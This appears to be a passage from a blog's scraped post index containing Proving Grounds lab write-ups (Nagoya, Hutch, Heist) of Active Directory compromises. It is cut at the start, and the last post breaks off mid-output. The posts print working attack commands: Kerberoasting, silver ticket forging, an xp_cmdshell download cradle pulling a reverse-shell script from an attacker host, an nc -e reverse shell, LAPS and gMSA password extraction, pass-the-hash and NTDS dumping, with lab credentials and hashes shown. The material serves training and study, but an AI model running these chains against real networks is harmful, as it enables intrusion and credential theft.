nagoya-industries.com/Fiona.Clark:Summer2023 -dc-ip 192.168.202.21 -request```{: .nolineno}![Image](Pasted%20image%2020240702220755.png)_kerberostable users with TGS tickets_Lets crack these hashes with JohnTheRipper Tool ðŸ”½![Image](Pasted%20image%2020240702221111.png)_John the ripper tool that cracked the hash password_I got the password of the user svc_mssql with john the ripper with using password wordlists as ***rockyou.txt*** .I also got cracked the hash of the user svc_helpdesk from using another wordlists .From SMB Shares I got these files ðŸ”»![Image](Pasted%20image%2020240702222627.png)_SMB Shares accessed from smbclient Tool_I have performed reverse engineering into this `ResetPassword.exe` executable file and found the credentails of the user svc_helpdesk.You can't simply string the File and get the creds as it is LT 16 Encoded so I had to use a debugger application dnspy Tool.```{: .nolineno}svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg```{: .nolineno}Now I looked into the bloodhound mapping as I want to look the bigger picture as map perspective.![Image](Pasted%20image%2020240704091242.png)_Bloodhound Mapping_Here it stats that I can move to CHRISTOPHER.LEWIS user by abusing GenericAll permissions .![Image](Pasted%20image%2020240704091420.png)_Force Change Password from linux machine_So I means the svc_helpdesk user can change passwords ðŸ”»```bashnet rpc password \"Christopher.Lewis\" \"StrongShiv8\" -U \"nagoya-industries.com\"/\"svc_helpdesk \"%\"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg\" -S \"nagoya.nagoya-industries.com\"```{: .nolineno}This changed the password of user Christopher.Lewis ðŸ”»![Image](Pasted%20image%2020240704091928.png)_Netexec Tool , checking the working of creds_There is also another way to change the password of this user Christopher.Lewis , Through rpcclient Tool by accessing MSRPC.n the `rpcclient` tool, the `setuserinfo2` command with level 23 is typically used to change user attributes, including setting a new password for a user account. To use this command, the user must have sufficient privileges. Generally, this means the user must have administrative privileges or be a member of a group with delegated rights to manage user accounts.Eligible users include:1. **Domain Admins**: Members of the Domain Admins group have full control over all aspects of the domain, including user accounts.2. **Account Operators**: Members of the Account Operators group have permissions to manage user accounts and groups, except for accounts in the Administrators group.3. **Administrators**: Local administrators on the domain controllers can also use this command.4. **Users with Delegated Rights**: Any user or group that has been specifically delegated the rights to change user information through Active Directory delegation.To check if a user has these privileges, you can look at the user's group memberships and any specific delegation settings applied in Active Directory.Using `rpcclient` to change user information with level 23 typically looks like this:```shellrpcclient -U \"username%password\" -c \"setuserinfo2 username 23 'newpassword'\" target_server```{: .nolineno}Replace `username`, `password`, and `target_server` with appropriate values.To determine eligibility and check permissions, you might need to:1. **Check Group Membership**: Verify if the user is a member of Domain Admins, Account Operators, or another privileged group.2. **Review Delegations**: Use tools like Active Directory Users and Computers (ADUC) or PowerShell to review any specific delegations for managing user accounts.Here is an example of how you might use PowerShell to check group membership:```powershellGet-ADUser -Identity username -Properties MemberOf | Select-Object -ExpandProperty MemberOf```{: .nolineno}This command will list all groups that the specified user is a member of, allowing you to verify their permissions.In summary, to use `setuserinfo2` with level 23 in `rpcclient`, the user must have appropriate administrative or delegated permissions to manage user accounts.In this case I will be changind the password like this ðŸ”»```bashrpcclient -U \"svc_helpdesk%U299iYRmikYTHDbPbxPoYYfa2j4x4cdg\" -c \"setuserinfo2 Christopher.Lewis 23 'StrongShiv8'\" 192.168.191.21```{: .nolineno}Now when I change the password so lets also access its winrm session with evil-winrm Tool.![Image](Pasted%20image%2020240704093129.png)_network connections using netstat Tool_I found port 1433 running on this system so lets access it by doing Port Forwarding.#### Port Forwarding ðŸ”»I will be using chisel Tool to do so ðŸ”»![Image](Pasted%20image%2020240704103712.png)_Chisel connection established_Lets check the connection with nmapðŸ”»![Image](Pasted%20image%2020240704103847.png)_Nmap connection check for mssql service over localhost_But I can't able to access that service with the creds I have of user svc_msql .#### Silver Ticket that will impersonate Administrator user ðŸ”»SinceÂ `svc_mssql`Â is service user, we can try impersonating the administrator using silver tickets.```bashimpacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator```{: .nolineno}- **-nthash** `E3A0168BC21CFB88B95C954A5B18F57C` â© This is the hash of service account password here the password is Service1 .- **-domain-sid** `S-1-5-21-1969309164-1513403977-1686805993` â© This is the SID of the service account which can be get like this `Get-DomainSID` .- **-domain** `nagoya-industries.com` â© This is the domain name .- **-spn** `MSSQL/nagoya.nagoya-industries.com` â© To get this info run this command `Get-ADUser -Identity username -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName`- **-user-id** `500` â© This information indicated the user Identity code and like for administrator it is 500, you can access it from seeing the last portion of the *sid* value.- **Impersonation username** `Administrator`Lets export it to kerberos environment variable **KRB5CCNAME** .```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ export KRB5CCNAME=`pwd`/Administrator.ccache ```{: .nolineno}>[!Summary] Always remember when you access the ticket like `Administrator.ccache` , Do check for what it is for with `klist` command that can be activated by installing `sudo apt-get install krb5-user` .>That will give you the idea for that this ticket is for like ðŸ”» >>```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ klistTicket cache: FILE:/home/kali/Downloads/Proving_Ground/Practice/Nagoya/Administrator.ccacheDefault principal: Administrator@NAGOYA-INDUSTRIES.COMValid starting Expires Service principal07/02/2024 08:53:56 06/30/2034 08:53:56 MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM > renew until 06/30/2034 08:53:56>```>As you can see above this ticket is for accessing `MSSQL` service by like impacket-mssqlclient or mssqlclient.py Tool.OR >[!Summary] You can also check whether the ticket it imported or working or not with netexec / crackmapexec ToolðŸ”»>```bashnxc smb 192.168.156.175 --use-kcache>```>![Image](Pasted%20image%2020240813145432.png)Now lets again access this `mssql` service with this TGS ticket that I got ðŸ”»### MSSQL Service â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ impacket-mssqlclient -k NAGOYA.NAGOYA-INDUSTRIES.COM -dc-ip 192.168.177.21 -target-ip 127.0.0.1Impacket v0.12.0.dev1 - Copyright 2023 Fortra[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(nagoya\\SQLEXPRESS): Line 1: Changed database context to 'master'.[*] INFO(nagoya\\SQLEXPRESS): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) [!] Press help for extra shell commandsSQL (NAGOYA-IND\\Administrator dbo@master)>```{: .nolineno}Now I need to enable `xp_cmdshell` that will give me power to execute commands and for that I followed this [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#tricks) reference site.```sql# Check if xp_cmdshell is enabledSELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';# This turns on advanced options and is needed to configure xp_cmdshellsp_configure 'show advanced options', '1'RECONFIGURE#This enables xp_cmdshellsp_configure 'xp_cmdshell', '1'RECONFIGURE```{: .nolineno}Now the `xp_cmdshell` command it enabled so lets check and then use this command to get a reverse shell , I will be using **Invoke-PowerShellTcp.ps1** commands to get the reverse shell.```bashSQL (NAGOYA-IND\\Administrator dbo@master)> EXEC master..xp_cmdshell 'whoami'output -------------------- nagoya-ind\\svc_mssql NULL SQL (NAGOYA-IND\\Administrator dbo@master)>SQL (NAGOYA-IND\\Administrator dbo@master)> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.45.157:2222/Invoke-PowerShellTcp.ps1\") | powershell -noprofile'```{: .nolineno}I got the shell in receivers end ðŸ”½![Image](Pasted%20image%2020240704105229.png)_Shell as svc_mssql service account_As I have service account and also I got the SeImpersonatePrivilege Enabled so lets user PrintSpoofer Tool to Impersonate as Administrator or higher privileges.![Image](Pasted%20image%2020240704105441.png)_whoami /priv output_>[!Info] I am using PrintSpoofer because, Tools like printspoofer works from LOCAL/NETWORK SERVICE Account to SYSTEM by abusingÂ `SeImpersonatePrivilege`Â on Windows 10 and Server 2016/2019.I then transfered netcat executable into the machine for connection back ðŸ”»```powershellPS C:\\Users\\svc_mssql\\Desktop> .\\PrintSpoofer64.exe -i -c 'C:\\Users\\svc_mssql\\Desktop\\nc.exe -e powershell.exe 192.168.45.157 443'```{: .nolineno}```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [192.168.45.157] from (UNKNOWN) [192.168.177.21] 50012Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\Windows\\system32> whoamiwhoaminagoya-ind\\nagoya$PS C:\\Windows\\system32> ```{: .nolineno}As I am a machine Account having privileges as Administrator user , Lets check the Administrator flags ðŸ”»```powershellPS C:\\Windows\\system32> cd \\Users\\Administrator\\cd \\Users\\Administrator\\PS C:\\Users\\Administrator> tree /f /atree /f /aFolder PATH listingVolume serial number is 4CB9-C891C:.+---3D Objects+---Contacts+---Desktop| email.txt| proof.txt| +---Documents| +---SQL Server Management Studio| | \\---Code Snippets| | \\---SQL| | \\---My Code Snippets| \\---Visual Studio 2017| \\---Templates| +---ItemTemplates| | +---JavaScript| | \\---TypeScript| \\---ProjectTemplates| +---JavaScript| \\---TypeScript+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosPS C:\\Users\\Administrator> cat Desktop\\proof.txtcat Desktop\\proof.txtae5e032d0e25fa28bd77aacf8f786593PS C:\\Users\\Administrator> cat Desktop\\email.txtcat Desktop\\email.txtQ1RGMzAwTFZMTWlkWWVhcjMwMEBvZmZzZWMuY29tPS C:\\Users\\Administrator> ```{: .nolineno}I am Administrator Now !!Loved this machine ðŸ«¡> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Hutch", "url": "/posts/Hutch/", "categories": "Proving Grounds, Practice", "tags": "ReadLAPSPassword, Active Directory, LDAP, PrivEsc, BloodHound", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Hutch]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.182.122Nmap scan report for 192.168.182.12...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Hutch]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.182.122Nmap scan report for 192.168.182.122Host is up, received user-set (0.098s latency).Scanned at 2024-06-17 08:40:26 IST for 310sNot shown: 65514 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 125 Simple DNS Plus80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT|_ Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT| http-webdav-scan: | Server Type: Microsoft-IIS/10.0| Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK| WebDAV type: Unknown| Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK|_ Server Date: Mon, 17 Jun 2024 03:14:53 GMT|_http-title: IIS Windows Server88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-06-17 03:14:04Z)135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 125464/tcp open kpasswd5? syn-ack ttl 125593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack ttl 1253268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack ttl 1255985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf syn-ack ttl 125 .NET Message Framing49666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49668/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49673/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49676/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49692/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49765/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPCService Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-06-17T03:14:58|_ start_date: N/A|_clock-skew: 0s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 44850/tcp): CLEAN (Timeout)| Check 2 (port 43105/tcp): CLEAN (Timeout)| Check 3 (port 9845/udp): CLEAN (Timeout)| Check 4 (port 57312/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno}## LDAP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Hutch]â””â”€$ ldapsearch -x -b 'DC=hutch,DC=offsec' -H ldap://192.168.182.122 # extended LDIF## LDAPv3# base with scope subtree# filter: (objectclass=*)# requesting: ALL## hutch.offsecdn: DC=hutch,DC=offsec# Administrator, Users, hutch.offsecdn: CN=Administrator,CN=Users,DC=hutch,DC=offsec# Guest, Users, hutch.offsecdn: CN=Guest,CN=Users,DC=hutch,DC=offsecobjectClass: topobjectClass: personobjectClass: organizationalPersonobjectClass: usercn: Guestdescription: Built-in account for guest access to the computer/domaindistinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsecinstanceType: 4whenCreated: 20201104052540.0ZwhenChanged: 20201104052540.0ZuSNCreated: 8197memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsecuSNChanged: 8197name: GuestobjectGUID:: VKtEAAOQ8ki8PKRBs7xH+A==userAccountControl: 66082badPwdCount: 2codePage: 0countryCode: 0badPasswordTime: 133630748499810721lastLogoff: 0lastLogon: 0pwdLastSet: 0primaryGroupID: 514objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn9QEAAA==accountExpires: 9223372036854775807logonCount: 0sAMAccountName: GuestsAMAccountType: 805306368objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsecisCriticalSystemObject: TRUEdSCorePropagationData: 20201104053513.0ZdSCorePropagationData: 20201104052623.0ZdSCorePropagationData: 16010101000417.0Z# krbtgt, Users, hutch.offsecdn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec......```{: .nolineno}I got some sorting done from ldap result and turns out I have a password given in description key value ðŸ”»![Image](Pasted%20image%2020240617110347.png)That turns out to be a password of a use that that was mentioned into the description value , Now lets collect some usernames also and for that I need to sort this ldap result on the basis of sAMAccountName ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Hutch]â””â”€$ ldapsearch -x -b 'DC=hutch,DC=offsec' -H ldap://192.168.182.122 | grep sAMAccountName | awk '{print $2}'GuestDomainCertDomainDomainGroupRASAllowedDeniedEnterpriseCloneableProtectedDnsAdminsDnsUpdateProxyrplacidiopatryltauntonacostellojsparwellokneejmckendryavictoriajfrareyeaburrowcluddyagitthousefmcsorley```{: .nolineno}I made a username file named as users.txt ðŸ”»Through crackmapexec I got the smb access on user fmcsorley ðŸ”»![Image](Pasted%20image%2020240617111450.png)Lets collect some bloodhound data to investigate the connections further more ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Hutch]â””â”€$ sudo bloodhound-python -d hutch.offsec -u fmcsorley -p '' -ns 192.168.182.122 -c all[sudo] password for kali: INFO: Found AD domain: hutch.offsecINFO: Getting TGT for userWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not knownINFO: Connecting to LDAP server: hutchdc.hutch.offsecINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: hutchdc.hutch.offsecINFO: Found 18 usersINFO: Found 52 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: hutchdc.hutch.offsecINFO: Done in 00M 22S```{: .nolineno}![Image](Pasted%20image%2020240617104832.png)###### ReadLAPSPasswordSufficient control on a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd.[pyLAPS](https://github.com/p0dalirius/pyLAPS) can be used to retrieve LAPS passwords:```bashpyLAPS.py --action get -d \"DOMAIN\" -u \"ControlledUser\" -p \"ItsPassword\"```{: .nolineno}Lets use on fmcsorley user ðŸ”»![Image](Pasted%20image%2020240617105502.png)Another way to extract this password through netexec like this ðŸ”»```bashnxc ldap hutch.offsec -u fmsorley -p '' -M laps```{: .nolineno}I got password seams like it is the password for Administrator as I verified with crackmapexec Tool ðŸ”»![Image](Pasted%20image%2020240617105346.png)Finally Lets have a Administrative shell ðŸ”»```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Hutch]â””â”€$ evil-winrm -i 192.168.182.122 -u Administrator -p Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> whoamihutch\\administrator*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 0A26-9DC1C:.+---3D Objects+---Contacts+---Desktop| proof.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> ```{: .nolineno}OR I can also extract the NTLM hashes of the other users with netexec Tool through giving `--ntds` flag ðŸ”»```bashnxc smb hutch.offsec -u Administrator -p --ntds```{: .nolineno}![Image](Pasted%20image%2020240819172343.png)I am Administrator Now !> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Heist", "url": "/posts/Heist/", "categories": "Proving Grounds, Practice", "tags": "SeRestorePrivilege, BloodHound, ReadGMSAPassword, Active Directory, responder, NTLM_relay, PrivEsc", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Heist]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.182.165PORT STATE SERVICE REASO...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Heist]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.182.165PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 125 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-06-16 10:35:08Z)135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 125464/tcp open kpasswd5? syn-ack ttl 125593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack ttl 1253268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack ttl 1253389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services|_ssl-date: 2024-06-16T10:36:37+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: HEIST| NetBIOS_Domain_Name: HEIST| NetBIOS_Computer_Name: DC01| DNS_Domain_Name: heist.offsec| DNS_Computer_Name: DC01.heist.offsec| DNS_Tree_Name: heist.offsec| Product_Version: 10.0.17763|_ System_Time: 2024-06-16T10:35:58+00:00| ssl-cert: Subject: commonName=DC01.heist.offsec| Issuer: commonName=DC01.heist.offsec| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-03-22T06:03:39| Not valid after: 2024-09-21T06:03:39| MD5: 7102:ce1d:1524:300f:d350:8e3d:ec8a:4108| SHA-1: 1f39:8bc4:d116:59fa:50c3:e2ec:f0d2:1f20:0a54:4575| -----BEGIN CERTIFICATE-----| MIIC5jCCAc6gAwIBAgIQIL4xOi+AQIBNnAB2Uaa0ajANBgkqhkiG9w0BAQsFADAc| MRowGAYDVQQDExFEQzAxLmhlaXN0Lm9mZnNlYzAeFw0yNDAzMjIwNjAzMzlaFw0y| NDA5MjEwNjAzMzlaMBwxGjAYBgNVBAMTEURDMDEuaGVpc3Qub2Zmc2VjMIIBIjAN| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7JP1k9j0vyXKMJUd+8zHq6h1ZojH| zei73ZTZN53nwNSwi6HrfJl1C1+wrV/ggJqSn4+1pJa8p3UWlbrpJa7qlJ2YU7hb| MfMXZgcs1XBxvjCuTr6eEh4Pbg6IRXCjtx3dN1Mhsetb2gSrdkTId8HpFIQtrcsR| 5JrbR2gy/SHmG9uJ7cpxbZj6oJ0Wl2rXxxqhQ1wNWsQkPIZFOBW/uGVryLO6JUl9| 9zlKoWfQgMmEp8tt728vpia/WPt01a5yLcOgSUmW8TOTO6Q2WiiVSSK21iEKdiZi| Nx2Gt69ZWsGxNG+dtga9p/kxMXGpQuQjzHHrYfzcsY8j8p8Nr/j4KwJPVQIDAQAB| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN| AQELBQADggEBAJl7FjnLpRiZu8dBafbC/NyHzWVCs1lx3sT1f5+KYPJSy99kYHMu| oVR/JT0AeROSHlKI2AvvOk00R5fkD65ZdwpSR1jjDSZ81w0rgvJMyRY8wiztJ2nV| Cpc5E1d2HbW/vfME3npWA7Jk7MgwMxYmyALz7QN04MyqV7zqkr1r7si0ua/WQxf6| amZk51Z1mAy7kwcZUndkQmvx/HOHm1G4y+OfK1lAO7RBmDE90J7dojnB8s/nE/LL| cBs4VecSjy/R491wB/v9dHEhrxwBBHxjZ1rcCi1oprD3GdVLk5+SCSpSGvaB6Jp6| 1BseuTDFKjVfkV3T569S1pLDmY5MiUjsoOA=|_-----END CERTIFICATE-----5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found8080/tcp open http syn-ack ttl 125 Werkzeug httpd 2.0.1 (Python 3.9.0)|_http-server-header: Werkzeug/2.0.1 Python/3.9.0| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-title: Super Secure Web Browser9389/tcp open mc-nmf syn-ack ttl 125 .NET Message Framing49666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49669/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49673/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49677/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49705/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49763/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPCService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 9143/tcp): CLEAN (Timeout)| Check 2 (port 4723/tcp): CLEAN (Timeout)| Check 3 (port 42884/udp): CLEAN (Timeout)| Check 4 (port 64413/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: mean: 0s, deviation: 0s, median: 0s| smb2-time: | date: 2024-06-16T10:36:01|_ start_date: N/A```{: .nolineno}## Web Enumeration â¤µï¸I checked port 8080 and looks like a Web Browser URL entering page ðŸ”»![Image](Pasted%20image%2020240616170044.png)I redirecting me to another location through `url` parameter ðŸ”»![Image](Pasted%20image%2020240616170100.png)That gives me access to check for NTLM relay attack by specifying the URL of attacker machine and catching the response as password hash from responder Tool like this ðŸ”»![Image](Pasted%20image%2020240616165958.png)![Image](Pasted%20image%2020240616165945.png)_responder Tool that catches the NTLM hash_Now lets crack this hash with John The Ripper Tool.![Image](Pasted%20image%2020240616170610.png)I got the password lets check if this user hiest can access `winrm` session or not.![Image](Pasted%20image%2020240616171403.png)```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Heist]â””â”€$ evil-winrm -i 192.168.182.165 -u enox -p Evil-WinRM shell v3.5*Evil-WinRM* PS C:\\Users\\enox> tree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---Desktop| | local.txt| | todo.txt| || \\---application| | app.py| || \\---templates| error.html| index.html|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\enox>*Evil-WinRM* PS C:\\Users\\enox\\Desktop> type local.txtfeed776dc465618634f06fcc4ce1c017*Evil-WinRM* PS C:\\Users\\enox\\Desktop> type todo.txt- Setup Flask Application for Secure Browser [DONE]- Use group managed service account for apache [DONE]- Migrate to apache- Debug Flask Application [DONE]- Remove Flask Application- Submit IT Expenses file to admin. [DONE]*Evil-WinRM* PS C:\\Users\\enox\\Desktop>```{: .nolineno}Now I opened Bloodhound and checked the other privileges to move laterally.![Image](Pasted%20image%2020240617001636.png)I get ReadGMSAPassword Permissions on user svc_apache so lets abuse that using this Tool ðŸ”»You can download the executable exploit tool from here [GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe) ```powershell*Evil-WinRM* PS C:\\Users\\enox\\Desktop> .\\GMSAPasswordReader.exe --AccountName 'svc_apache$'Calculating hashes for Old Value[*] Input username : svc_apache$[*] Input domain : HEIST.OFFSEC[*] Salt : HEIST.OFFSECsvc_apache$[*] rc4_hmac : A266E0F8D19F9CDB92AD8C658F86AFFA[*] aes128_cts_hmac_sha1 : 50B54BE046548576B96FFF5B97C8C733[*] aes256_cts_hmac_sha1 : 0BFA50E65DF92D77DC37018814AB1AB835FDF5EBE7AE3867FB49F387BB477322[*] des_cbc_md5 : 70D5527CA470D380Calculating hashes for Current Value[*] Input username : svc_apache$[*] Input domain : HEIST.OFFSEC[*] Salt : HEIST.OFFSECsvc_apache$[*] rc4_hmac : 023145FC00CE8BAB62704EB63AB7BDAB[*] aes128_cts_hmac_sha1 : 49334D8F2312B4BEB67170A06E7844AF[*] aes256_cts_hmac_sha1 : 4D3F8EC980BB8539A0545D41CCAB3931235A563D9123D22ECBC67AE3F00F903E[*] des_cbc_md5 : 3B615E3DD06BB02F*Evil-WinRM* PS C:\\Users\\enox\\Desktop> ```{: .nolineno}The `RC4` hashing is same as of `NTLM` hash so lets try to **Pass The Hash** and see which hash is working new one or old one ðŸ”»![Image](Pasted%20image%2020240617001910.png)I got the right hash lets have a svc_apache$ machine shell now ðŸ”»```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Heist]â””â”€$ evil-winrm -i 192.168.182.165 -u 'svc_apache$' -H 023145FC00CE8BAB62704EB63AB7..... Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents> whoamiheist\\svc_apache$*Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents> whoami /allUSER INFORMATION----------------User Name SID================= =====================================heist\\svc_apache$ S-1-5-21-537427935-490066102-1511301751-1105GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ =========================================== ===========================================HEIST\\Domain Computers Group S-1-5-21-537427935-490066102-1511301751-515 Mandatory 